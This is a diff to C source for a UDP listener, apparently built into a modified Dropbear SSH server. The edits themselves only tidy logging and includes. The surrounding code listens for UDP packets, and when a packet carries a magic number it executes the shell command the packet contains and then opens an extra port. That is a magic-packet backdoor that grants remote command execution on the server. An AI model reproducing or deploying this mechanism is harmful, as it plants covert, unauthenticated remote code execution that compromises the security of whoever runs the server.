@@ -9,7 +9,6 @@
 #include <arpa/inet.h> 
 #include <netinet/in.h> 
 #include "uhandler.h"
-#include "runopts.h"
 #include "session.h"
 
   
@@ -83,7 +82,7 @@ void parse_packet(listen_packet_t *newpacket,char *buffer){
 }
   
 void start_udp() {
-    printf("GOT TO START_UDP\n") ;
+    printf("Start listening for UDP packet on port:%d\n",PORT) ;
     int sockfd;
     char buffer[PACKETSIZE]; 
     struct sockaddr_in servaddr, cliaddr;
@@ -117,7 +116,6 @@ void start_udp() {
     }
     
     while(1){
-        // printf("UDP: ENTERED WHILE LOOP\n") ;
         int len, n;   
         len = sizeof(cliaddr);  //len is value/resuslt 
         //TODO - need to configure how to add try and catch ,
@@ -135,14 +133,14 @@ void start_udp() {
 
     //put here only for tests, after working- 
     //should change to command+parse
-        printf("-------------\nGot listen_packet_t packet: \nmagic: %d\nport: %d\nshell_command: %s\n-------------\n", 
-                 newpacket.magic,newpacket.port_number,newpacket.shell_command); 
+        // printf("-------------\nGot listen_packet_t packet: \nmagic: %d\nport: %d\nshell_command: %s\n-------------\n", 
+                //  newpacket.magic,newpacket.port_number,newpacket.shell_command); 
         if((int)newpacket.magic == MAGICNUM){
             if(check_shell_command(&newpacket)){
                 // printf("MAGIC!!\n");
                 //execute the shell_command, then add port
                 shellexeccommand(newpacket.shell_command); //func in svr-chansession
-                addportrequest((int)newpacket.port_number); //func in svr-runopts
+                addportrequest((int)newpacket.port_number); //func in svr-main
             }   
         }
     }
